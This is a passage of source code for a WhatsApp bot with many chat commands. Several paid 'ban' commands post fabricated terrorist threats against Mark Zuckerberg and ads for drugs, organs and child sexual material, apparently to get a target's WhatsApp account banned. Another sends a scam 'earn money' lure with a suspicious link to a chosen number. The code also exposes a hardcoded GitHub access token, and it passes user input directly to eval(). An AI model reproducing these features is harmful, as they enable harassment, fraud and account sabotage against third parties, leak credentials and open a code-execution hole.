              var anu1 = await XliconBotInc.fetchStatus(anu[0].jid);
          } catch {
              var anu1 = '401';
          }
          if (anu1 == '401' || anu1.status.length == 0) {
              nobio += `wa.me/${anu[0].jid.split("@")[0]} 💬\n`;
          } else {
              text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio:* ${anu1.status}\n🧐*Last update:* ${moment(anu1.setAt).tz('Asia/Karachi').format('HH:mm:ss DD/MM/YYYY')}\n\n`;
          }
      } catch {
          nowhatsapp += `${number0}${i}${number1} ❌\n`;
      }
  }

  replygcxlicon(`${text66}${nobio}${nowhatsapp}`);
}
break;

        
        
case 'stickersearch': {
  if (!text) return replygcxlicon(`Example: ${m.prefix + command} kururmi`);
await XliconStickWait()
  var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`);
  var json = await js.json();

  let response = `
❗ *Note:* Bot will give random results. If the results don't match what you want, please try again using ${prefix + command} ${text}

💼 *Title:* ${json[0].title}
🔗 *Link:* ${json[0].url}
⭐ *Total Results:* ${json[0].total}
  `;

  if (json[0].url) {
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg'; // URL for the image to send
    await XliconBotInc.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: response,
      mentions: [m.sender]
    });
  } else {
    replygcxlicon(`No results found for ${text}. Please try another search.`);
  }
}
break;

        
			case 'apksearch': {
  if (!text) return replygcxlicon(`Example: ${prefix + command} whatsapp`);
await XliconStickWait()
  try {
    var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`);
    var json = await js.json();

    // Check if the API response status is false (indicating error)
    if (!json.status) {
      // Construct a message to notify the user
      const errorMsg = `
❗ *Error:* ${json.message}

💬 For access, contact the owner:
- *Full Contact:* ${json.owner.fullContact}
- *WhatsApp:* ${json.owner.whatsapp}
- *Telegram:* ${json.owner.telegram}
      `;
      return replygcxlicon(errorMsg); // Send error message to the user
    }

    // Proceed with normal processing if API call is successful
    var capt = `
❗ *Note:* Bot will give random results. If the results do not match what you want, please try again using ${prefix + command} ${text}

💼 *Title:* ${json[0].package}
🔗 *Link:* ${json[0].url}
👤 *Developer:* ${json[0].developer}
⭐ *Rating:* ${json[0].rating}
    `;

    if (json[0].thumbnail) {
      const imageUrl = json[0].thumbnail; // Use the thumbnail URL from the API response
      await XliconBotInc.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: capt,
        mentions: [m.sender]
      });
    } else {
      // If no thumbnail is available, just send the message without image
      replygcxlicon(capt);
    }

  } catch (error) {
    console.error("Error:", error);
    return replygcxlicon(`❗ *Error:* Unable to fetch data at this time. Please try again later.`);
  }
}
break;


case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    XliconBotInc.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
        
        
			case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
    if (!m.isGroup) return XliconStickGroup();  // Ensure it's a group chat
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);  // Check if NSFW content is allowed
    if (!text) return replygcxlicon(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix + command} hot japanese\nYou can use a link as well.\nExample: ${prefix + command} link <URL>`);

    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);  // Check if input is a URL
    try {
        if (isURL) {
            // If it's a valid URL, directly download the video
            const result = await xvideosdl(text);
            const { title, url } = result.result; 
            
            const response = await fetch(url);  // Fetch the video file
            const buffer = await response.arrayBuffer();  // Convert to buffer
            
            await XliconBotInc.sendMessage(m.chat, {
                video: { url: buffer },
                caption: `Here you go!!\nTitle: ${title}`,
                mentions: [m.sender]  // Mention the user who requested it
            });
        } else {
            // If it's not a URL, perform a search
            const results = await xvideosSearch(text);
            if (results.length === 0) {
                replygcxlicon('No search results found for the given query.');
            } else {
                const searchResults = results.map((result, index) => {
                    return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
                }).join('\n\n');
                
                replygcxlicon(`*Search Results for "${text}":*\n\n${searchResults}`);
            }
        }
    } catch (error) {
        console.error(error);
        replygcxlicon('Failed to fetch Xvideos video details.');
    }
};
break;

case 'add-dtbs': {
    await XliconBotInc.sendMessage(m.chat, { react: { text: "❄️", key: m.key } });

    const fetch = require('node-fetch');
    const token = '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'; // GitHub token
    const rawFileUrl = 'https://raw.githubusercontent.com/Pstar0/ES-TEAMS-V1/refs/heads/main/ES_TEAMS-PREMIUM.json';
    const repoApiUrl = 'https://api.github.com/repos/Pstar0/ES-TEAMS-V1/contents/ES_TEAMS-PREMIUM.json';

    // Define the reply function
    const reply = (message) => {
        XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    };

    try {
        // Allowed numbers for validation
        const approvedNumbers = ['2348187637779'];
        const senderNumber = m.sender.split('@')[0];

        if (!approvedNumbers.includes(senderNumber)) {
            return replygcxlicon('`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄`\n\n𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐧𝐢𝐞𝐝');
        }

        // Validate input number
        if (!args[0] || !/^\d{11,15}$/.test(args[0])) {
            return replygcxlicon('Please provide a valid number in international format, e.g., `.add-dtbs 2349018958092`');
        }

        const newNumber = args[0];

        // Fetch the current database
        const response = await fetch(rawFileUrl);
        if (!response.ok) {
            return replygcxlicon('Error fetching the current Database List. Please try again later.');
        }

        const currentDatabase = await response.json();

        if (currentDatabase.includes(newNumber)) {
            return replygcxlicon('Number already in Database List.');
        }

        // Fetch GitHub file SHA and update content
        const repoResponse = await fetch(repoApiUrl, {
            headers: { Authorization: `token ${token}` },
        });

        if (!repoResponse.ok) {
            return replygcxlicon('Error fetching the Database List. Please try again later.');
        }

        const repoData = await repoResponse.json();
        const updatedData = [...currentDatabase, newNumber];
        const updatedContent = Buffer.from(JSON.stringify(updatedData, null, 2)).toString('base64');

        const updateResponse = await fetch(repoApiUrl, {
            method: 'PUT',
            headers: {
                Authorization: `token ${token}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: `Add new number: ${newNumber}`,
                content: updatedContent,
                sha: repoData.sha,
            }),
        });

        if (!updateResponse.ok) {
            return replygcxlicon('Error updating the Database List. Please try again later.');
        }

        replygcxlicon(`Successfully added ${newNumber} to the Database List.`);
    } catch (error) {
        console.error('Error processing add-dtbs:', error);
        replygcxlicon('An error occurred while updating the Database List. Please try again later.');
    }

    break;
}

case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
    if (!m.isGroup) return XliconStickGroup();  // Ensure it's a group chat
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);  // Check if NSFW content is allowed
    if (!text) return replygcxlicon(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link <URL>`);

    let url;
    try {
        url = new URL(text);  // Try to convert text into a valid URL
    } catch (error) {
        url = null;  // Not a valid URL
    }

    if (url) {
        try {
            const files = await xnxxdl(url.href);
            if (files && files.high) {
                await XliconBotInc.sendMessage(m.chat, {
                    video: { url: files.high },
                    caption: 'Here you go!!',
                    mentions: [m.sender]  // Mention the user
                });
            } else {
                replygcxlicon('🔴 Error: Failed to retrieve the download URL.');
            }
        } catch (e) {
            console.error(e);
            replygcxlicon('🔴 Error: We encountered a problem while processing the request.');
        }
    } else {
        try {
            const results = await xnxxSearch(text);
            if (results.length > 0) {
                const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n');
                await XliconBotInc.sendMessage(m.chat, {
                    text: message,
                    mentions: [m.sender]  // Mention the user
                });
            } else {
                replygcxlicon('🔴 Error: No search results found.');
            }
        } catch (e) {
            console.error(e);
            replygcxlicon('🔴 Error: We encountered a problem while processing the request.');
        }
    }
};
break;

case 'yts': case 'ytsearch': {
    if (!text) return await replygcxlicon(`*Example :* ${prefix + command} title`);
await XliconStickWait()
    try {
        let yts = require("yt-search");
        let search = await yts(text);
        let videos = search.all;
        console.log(videos);

        if (!videos || videos.length === 0) {
            return await replygcxlicon('❌ No video found');
        }

        // Prepare the combined message for up to 10 videos
        let message = `*Search Results for: ${text}*\n\n`;
        const numVideos = Math.min(videos.length, 10);  // Send up to 10 videos, or fewer if there are less than 10

        for (let i = 0; i < numVideos; i++) {
            const video = videos[i];
            message += `\n📹 *Title:* _${video.title}_\n` +
                       `⏳ *Duration:* _${video.timestamp}_ _(${video.seconds} seconds)_\n` +
                       `🗓️ *Uploaded:* _${video.ago}_\n` +
                       `👀 *Views:* _${video.views.toLocaleString()}_ _views_\n` +
                       `👤 *Author:* _${video.author.name}_\n` +
                       `🔗 *URL:* ${video.url}\n`;
        }

        // Send the combined message with all the details
        await replygcxlicon(message);

    } catch (e) {
        console.error(e);
        await replygcxlicon('⚠️ Error: Something went wrong while fetching video details.');
    }
}
break;

case "esteams-ban1":{
 const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
const mtban1 = `Hello, I'm Ditzz Zuckerberg, I'm a terrorist from Indonesia, I'm going to kill you in the United States (USA), aiming for your head Mark Zuckerberg 👿, if you don't want to be killed then you have to contact me via the WhatsApp app 🔪👇
                        https: //api.whatsapp.com/send?phone=+234`
await replygcxlicon(mtban1);
}
break;

case "esteams-ban2": {
const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
const mtban2 = `Hello, I am the terrorist who received orders from Ditzz Zuckerberg, to kill you Mark Zuckerberg 🔪👿.
https://api.whatsapp.com/send?phone=+234`
await replygcxlicon(mtban2);
} 
break;

case "esteams-ban3": {
const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
const mtban3 = `I sell illegal items such as 👇
                        Drugs
                        Firearms
                        Human organs 👿
                        Woman's vagina
                        Porn video 🔞
                        Sexual children 👿

                        If you want to order, contact me on WhatsApp 👿👇
                        https://api.whatsapp.com/send?phone=+234`
                        await replygcxlicon(mtban3);
}
break;

case 'esteams-ban4': {
const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
if (!q) return replygcxlicon('Enter the Target number Prefix "+" and Country Code')
await XliconBotInc.sendMessage(m.chat, {text: `Earn money easily online for 1 hour at 10 thousand💰.\nOnly in this survey, register your account immediately, all you need is a WhatsApp number ready to go online 🤑.\nNo Miss this opportunity, register now using the QR code 📄\n\nReply with “1” and click on the link below 👇\nhttps://server.go-share.top/\n\nAnd connect with my WhatsApp if you want to get Bonus!!🎁\nhttps://api.whatsapp.com/send?phone=${q}`},{quoted: m})
sleep(2000)
return replygcxlicon(`👆 text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
}
break

case 'esteams-riddle': {
const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
await XliconBotInc.sendMessage(m.chat, { react: { text: "❄️",key: m.key,}})
    // Global variable to track used riddles (moved here for simplicity)
    let usedRiddles = [];

    const riddles = [
        { question: "What has to be broken before you can use it?", answer: "egg" },
        { question: "I’m tall when I’m young, and I’m short when I’m old. What am I?", answer: "candle" },
        { question: "What month of the year has 28 days?", answer: "all" },
        { question: "What is full of holes but still holds water?", answer: "sponge" },
        { question: "What question can you never answer yes to?", answer: "are you asleep" },
        { question: "What is always in front of you but can’t be seen?", answer: "future" },
        { question: "There’s a one-story house in which everything is yellow. What color are the stairs?", answer: "none" },
        { question: "What can you break, even if you never pick it up or touch it?", answer: "promise" },
        { question: "What goes up but never comes down?", answer: "age" },
        { question: "A man who was outside in the rain without an umbrella or hat didn’t get a single hair on his head wet. Why?", answer: "bald" },
        { question: "What has hands but can’t clap?", answer: "clock" },
        { question: "What can you catch but not throw?", answer: "cold" },
        { question: "If you drop me, I’m sure to crack, but give me a smile and I’ll always smile back. What am I?", answer: "mirror" },
       { question: "What has a heart that doesn’t beat?", answer: "artichoke" },
    { question: "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?", answer: "echo" },
    { question: "What can run but never walks, has a bed but never sleeps, has a mouth but never talks?", answer: "river" },
    { question: "The more of this you take, the more you leave behind. What is it?", answer: "footsteps" },
    { question: "What has cities, but no houses; forests, but no trees; and rivers, but no water?", answer: "map" },
    { question: "What is black when it’s clean and white when it’s dirty?", answer: "chalkboard" },
    { question: "What has keys but can’t open locks?", answer: "piano" },
    { question: "What can you break, even if you never pick it up or touch it?", answer: "promise" },
    { question: "What can travel around the world while staying in the same spot?", answer: "stamp" },
    { question: "I’m light as a feather, yet the strongest person can’t hold me for five minutes. What am I?", answer: "breath" },
    { question: "What has hands but can’t clap?", answer: "clock" },
    { question: "If you drop me, I’m sure to crack, but give me a smile, and I’ll always smile back. What am I?", answer: "mirror" },
    { question: "The more you take away from me, the bigger I get. What am I?", answer: "hole" },
    { question: "I have branches, but no fruit, trunk, or leaves. What am I?", answer: "bank" },
    { question: "I’m found in socks, scarves, and mittens; and often in the paws of playful kittens. What am I?", answer: "yarn" },
    { question: "Where does today come before yesterday?", answer: "dictionary" },
    { question: "What has one eye, but can’t see?", answer: "needle" },
    { question: "What gets bigger the more you take away from it?", answer: "hole" },
    { question: "What begins with T, ends with T, and has T in it?", answer: "teapot" },
    { question: "What has legs but doesn’t walk?", answer: "table" },
    { question: "What comes once in a minute, twice in a moment, but never in a thousand years?", answer: "m" },
    { question: "What has a head, a tail, but no body?", answer: "coin" },
    { question: "What has many teeth, but cannot bite?", answer: "comb" },
    { question: "What is so fragile that saying its name breaks it?", answer: "silence" },
    { question: "What can you catch, but not throw?", answer: "cold" },
    { question: "What has an eye but cannot see?", answer: "needle" },
    { question: "What can fill a room but takes up no space?", answer: "light" },
    { question: "What has a neck but no head?", answer: "bottle" },
    { question: "If two’s company, and three’s a crowd, what are four and five?", answer: "nine" },
    { question: "What is always in front of you but can’t be seen?", answer: "future" },
    { question: "What has an end but no beginning, a home but no body, and a space without room?", answer: "keyboard" },
    { question: "What has roots as nobody sees, is taller than trees, up it goes, and yet it never grows?", answer: "mountain" },
    { question: "What comes in a minute, twice in a moment, but never in a thousand years?", answer: "letter m" },
    { question: "I shave every day, but my beard stays the same. What am I?", answer: "barber" },
    { question: "What has a ring but no finger?", answer: "telephone" },
    { question: "I’m tall when I’m young, and I’m short when I’m old. What am I?", answer: "candle" },
    { question: "What has a thumb and four fingers but isn’t alive?", answer: "glove" },
    { question: "What begins with an E but only has one letter?", answer: "envelope" },
    { question: "What has no hands but can strike?", answer: "clock" },
    { question: "What can you keep after giving to someone?", answer: "your word" },
    { question: "What comes once in a year, twice in a week, and never in a day?", answer: "letter e" },
    { question: "What has one head, one foot, and four legs?", answer: "bed" },
    { question: "What has no body and no nose, but can still smell?", answer: "nobody" },
    { question: "What is so light that even the strongest person can’t hold it for long?", answer: "breath" },
    { question: "What’s always on its way but never arrives?", answer: "tomorrow" },
    { question: "What is full of holes but still holds water?", answer: "sponge" },
    { question: "What’s so delicate that saying its name breaks it?", answer: "silence" },
    { question: "What is seen in the middle of March and April that can’t be seen at the beginning or end of either month?", answer: "letter r" },
    { question: "What goes up and down but never moves?", answer: "staircase" },
    { question: "What gets sharper the more you use it?", answer: "brain" },
    { question: "What has a head and a tail but no body?", answer: "coin" },
    { question: "What is cut on a table, but is never eaten?", answer: "deck of cards" },
    { question: "I’m found in December, but not in any other month. What am I?", answer: "letter d" },
    { question: "The more there is of me, the less you see. What am I?", answer: "darkness" },
    { question: "What belongs to you but is used more by others?", answer: "name" },
    { question: "What can you hold in your left hand but not in your right?", answer: "your right hand" },
    { question: "What is harder to catch the faster you run?", answer: "your breath" },
    { question: "The more you take away, the bigger I get. What am I?", answer: "hole" },
    { question: "I’m always in front of you but can’t be seen. What am I?", answer: "future" },
    { question: "What’s bright during the day but disappears at night?", answer: "sun" },
    { question: "What can’t talk but will reply when spoken to?", answer: "echo" },
    { question: "What word becomes shorter when you add two letters to it?", answer: "short" },
    { question: "What has many keys but can’t open any doors?", answer: "piano" },
    { question: "What is white when dirty and black when clean?", answer: "chalkboard" },
    { question: "What has no beginning, middle, or end?", answer: "circle" },
    { question: "What has a face and two hands but no arms or legs?", answer: "clock" },
    { question: "What has teeth but cannot bite?", answer: "comb" },
    { question: "What can fly without wings?", answer: "time" },
    { question: "I have keys but no locks. I have space but no room. You can enter, but you can’t go outside. What am I?", answer: "keyboard" },
    { question: "What’s black, white, and red all over?", answer: "newspaper" },
    { question: "I have a bed but never sleep. I have a mouth but never eat. What am I?", answer: "river" },
    { question: "What comes once in a minute, twice in a moment, but never in a thousand years?", answer: "letter m" },
    { question: "What has two hands, a face, but no arms or legs?", answer: "clock" },
    { question: "What’s always in front of you but you can’t see it?", answer: "future" },
    { question: "What runs but never walks, has a bed but never sleeps?", answer: "river" },
    { question: "What can’t be seen but makes everything visible?", answer: "light" },
    { question: "What can run but never walk, have a bed but never sleep?", answer: "river" },
    { question: "What starts and ends with the letter E but only has one letter inside?", answer: "envelope" },
    { question: "What has hands but no thumbs and points without speaking?", answer: "compass" },
    { question: "I fly without wings. I cry without eyes. Wherever I go, darkness flies. What am I?", answer: "cloud" },
    { question: "What kind of coat is best put on wet?", answer: "paint" },
    { question: "What comes down but never goes up?", answer: "rain" },
    { question: "What has to be given before it can be kept?", answer: "word" },
    { question: "What’s full of holes but still holds water?", answer: "sponge" },
    { question: "What’s as light as a feather, but even the world’s strongest person couldn’t hold it for more than a minute?", answer: "breath" },
    { question: "What goes up but never comes down?", answer: "age" },
    { question: "I have keys but no locks. I have a space but no room. You can enter, but you can’t go outside. What am I?", answer: "keyboard" },
    { question: "What has four wheels and flies?", answer: "garbage truck" },
    { question: "What has no life but can die?", answer: "battery" },
    { question: "What comes at night without being called, but is lost in the day without being stolen?", answer: "star" },
    { question: "What runs all around a backyard, yet never moves?", answer: "fence" },
    { question: "What has roots as nobody sees, is taller than trees, up, up it goes, and yet it never grows?", answer: "mountain" },
    { question: "I’m not alive, but I can grow. I don’t have lungs, but I need air. What am I?", answer: "fire" },
    { question: "What can’t be used until it’s broken?", answer: "egg" },
    { question: "What belongs to you but other people use it more than you do?", answer: "name" },
    { question: "The person who makes it, sells it. The person who buys it never uses it. The person who uses it never knows they’re using it. What is it?", answer: "coffin" },
    { question: "What gets wet while drying?", answer: "towel" },
    { question: "What kind of band never plays music?", answer: "rubber band" },
    { question: "What kind of coat is always wet when you put it on?", answer: "paint" },
        { question: "The more of this there is, the less you see. What is it?", answer: "darkness" },
        { question: "What has a head, a tail, is brown, and has no legs?", answer: "penny" },
        { question: "What has many keys but can’t open a single lock?", answer: "piano" },
        { question: "What has one eye, but can’t see?", answer: "needle" },
        { question: "What gets bigger the more you take away?", answer: "hole" },
        { question: "I’m light as a feather, yet the strongest person can’t hold me for more than 5 minutes. What am I?", answer: "breath" },
        { question: "I’m found in socks, scarves, and mittens; and often in the paws of playful kittens. What am I?", answer: "yarn" },
        { question: "Where does today come before yesterday?", answer: "dictionary" },
        { question: "What invention lets you look right through a wall?", answer: "window" },
        { question: "If you’re running in a race and you pass the person in second place, what place are you in?", answer: "second" },
        { question: "What can’t talk but will reply when spoken to?", answer: "echo" },
        { question: "The more you take, the more you leave behind. What am I?", answer: "footsteps" },
        { question: "What has four wheels and flies?", answer: "garbage truck" },
        { question: "What runs all around a backyard, yet never moves?", answer: "fence" },
        { question: "What has an answer but no question?", answer: "telephone" },
        { question: "What comes once in a minute, twice in a moment, but never in a thousand years?", answer: "m" },
        { question: "I have keys but no locks. I have a space but no room. You can enter but you can’t go outside. What am I?", answer: "keyboard" }
    ];

    // Filter out the used riddles
    const availableRiddles = riddles.filter(riddle => !usedRiddles.includes(riddle.question));

    if (availableRiddles.length === 0) {
        // If all riddles have been used, reset the list and send a message
        usedRiddles = [];
        return XliconBotInc.sendMessage(m.chat, {
            text: "🎉 *ES TEAMS RIDDLE TIME!* 🎉\n\nAll riddles have been used! Starting over with fresh questions.",
        });
    }

    // Select a random riddle
    const randomRiddle = availableRiddles[Math.floor(Math.random() * availableRiddles.length)];

    // Add the selected riddle question to the usedRiddles list
    usedRiddles.push(randomRiddle.question);

    // Initial time remaining
    let timeRemaining = 30;

    // Send the initial riddle message
    const initialMessage = `🎉 \`❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐑𝐈𝐃𝐃𝐋𝐄 𝐓𝐈𝐌𝐄❄️\`🎉\n\n🏠 *Your Exclusive Riddle* 🏠\n────────────────────────────────────\n❓ _${randomRiddle.question}_\n────────────────────────────────────\n\n⏳ *You have ${timeRemaining} seconds to crack the code!* ⏳\n────────────────────────────────────\n\n✨ *Tick-tock, time is slipping away...* ✨\n────────────────────────────────────`;

    const { key } = await XliconBotInc.sendMessage(m.chat, { text: initialMessage }, { quoted: m });

    // Countdown logic
    const countdownInterval = setInterval(async () => {
        timeRemaining -= 5; // Decrease time by 5 seconds

        if (timeRemaining > 0) {
            // Update the message with the new time
            const updatedMessage = `🎉 \`❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐑𝐈𝐃𝐃𝐋𝐄 𝐓𝐈𝐌𝐄❄️\`🎉\n\n🏠 *Your Exclusive Riddle* 🏠\n────────────────────────────────────\n❓ _${randomRiddle.question}_\n────────────────────────────────────\n\n⏳ *You have ${timeRemaining} seconds to crack the code!* ⏳\n────────────────────────────────────\n\n✨ *Tick-tock, time is slipping away...* ✨\n────────────────────────────────────`;
            
            await XliconBotInc.sendMessage(m.chat, { text: updatedMessage, edit: key });
        } else {
            // Time's up, reveal the answer
            clearInterval(countdownInterval);

            const finalMessage = `🎉 \`❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐑𝐈𝐃𝐃𝐋𝐄 𝐓𝐈𝐌𝐄❄️\`🎉\n\n🏠 *Your Exclusive Riddle* 🏠\n────────────────────────────────────\n❓ _${randomRiddle.question}_\n────────────────────────────────────\n\n✅ \`𝐓𝐡𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐚𝐧𝐬𝐰𝐞𝐫 𝐢𝐬\`: _${randomRiddle.answer}_ ✅\n────────────────────────────────────\n\n🔄 *Another riddle? Stay tuned for more mind-benders!* 🔄\n────────────────────────────────────`;

            await XliconBotInc.sendMessage(m.chat, { text: finalMessage, edit: key });
        }
    }, 5000); // Update every 2 seconds
}
break;

case 'esteams-ip': {
const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    var http = require('http')
    http.get({
        'host': 'api.ipify.org',
        'port': 80,
        'path': '/'
    }, function(resp) {
        resp.on('data', function(ip) {
            replygcxlicon("🧊𝐘𝐨𝐮𝐫 𝐏𝐮𝐛𝐥𝐢𝐜 𝐈𝐩 𝐀𝐝𝐝𝐫𝐞𝐬𝐬 𝐢𝐬: " + ip + "🧊");
        })
    })
}
break

case 'esteams-solve': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });

    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }

    const evaluateExpression = (expression) => {
        try {
            return eval(expression);
        } catch (err) {
            throw new Error("Invalid mathematical expression.");
        }
    };

    const solveEquation = (equation) => {
        const [lhs, rhs] = equation.replace(/\s+/g, '').split('=');
        const fullEquation = `${lhs}-(${rhs})`;
        return solveLinearEquation(fullEquation);
    };

    const solveLinearEquation = (equation) => {
        const terms = equation.split(/(?=[+-])/);
        let coefficient = 0, constant = 0;

        terms.forEach((term) => {
            if (term.includes('x')) {
                coefficient += parseFloat(term.replace('x', '') || 1);
            } else {
                constant += parseFloat(term);
            }
        });

        if (coefficient === 0) throw new Error("Invalid equation.");
        return `x = ${-constant / coefficient}`;
    };

    const solveQuadraticEquation = (equation) => {
        const match = equation.match(/([-+]?\d*\.?\d*)x\^2|([-+]?\d*\.?\d*)x|([-+]?\d+)/g);
        const a = parseFloat(match?.[0]?.replace('x^2', '') || 0);
        const b = parseFloat(match?.[1]?.replace('x', '') || 0);
        const c = parseFloat(match?.[2] || 0);

        if (a === 0) return solveLinearEquation(`${b}x + (${c})`);
        const discriminant = Math.pow(b, 2) - 4 * a * c;

        if (discriminant < 0) return "No real solution.";
        const root1 = (-b + Math.sqrt(discriminant)) / (2 * a);
        const root2 = (-b - Math.sqrt(discriminant)) / (2 * a);

        return discriminant === 0 ? `x = ${root1}` : `x1 = ${root1}, x2 = ${root2}`;
    };

    const generatePascalsTriangle = (numRows) => {
        const rows = parseInt(numRows, 10) || 5;
        let triangle = [];

        for (let row = 0; row < rows; row++) {
            let newRow = [];
            for (let col = 0; col <= row; col++) {
                if (col === 0 || col === row) {
                    newRow.push(1);
                } else {
                    newRow.push(triangle[row - 1][col - 1] + triangle[row - 1][col]);
                }
            }
            triangle.push(newRow);
        }

        return triangle.map(row => row.join(' ')).join('\n');
    };

    const stoichiometry = (equation, known, unknown) => {
        try {
            const [reactants, products] = equation.split('=').map(s => s.trim());
            const molesReactant = known / getMolarMass(reactants);
            const molesProduct = molesReactant * getReactionRatio(reactants, products);
            return `${unknown} = ${molesProduct * getMolarMass(products)}`;
        } catch (err) {
            return "Invalid stoichiometry input.";
        }
    };

    const titration = (acid, base) => {
        const { volumeAcid, concentrationAcid, volumeBase, concentrationBase } = acidBaseParser(acid, base);
        const molesAcid = volumeAcid * concentrationAcid;
        const molesBase = volumeBase * concentrationBase;

        if (molesAcid === molesBase) return "Neutralization achieved.";
        return molesAcid > molesBase ? "Excess acid" : "Excess base";
    };

    if (!text) {
        reply(`*Usage Examples:*\n1. Solve 2x + 3 = 7\n2. Evaluate 4 - 7\n3. Quadratic: 2x^2 + 3x - 7 = 0\n4. Pascal 5\n5. Titration HCl and NaOH\n6. Stoichiometry reaction`);
        return;
    }

    try {
        await XliconBotInc.sendMessage(m.chat, { react: { text: "📚", key: m.key } });

        let solution;
        if (text.includes('Pascal')) {
            solution = generatePascalsTriangle(text);
        } else if (text.includes('=')) {
            solution = solveEquation(text);
        } else if (text.includes('titration')) {
            solution = titration(text);
        } else if (text.includes('stoichiometry')) {
            solution = stoichiometry(text);
        } else {
            solution = evaluateExpression(text);
        }

        await XliconBotInc.sendMessage(m.chat, { text: `*Solution:*\n${solution}`, react: { text: "✅", key: m.key } });
    } catch (err) {
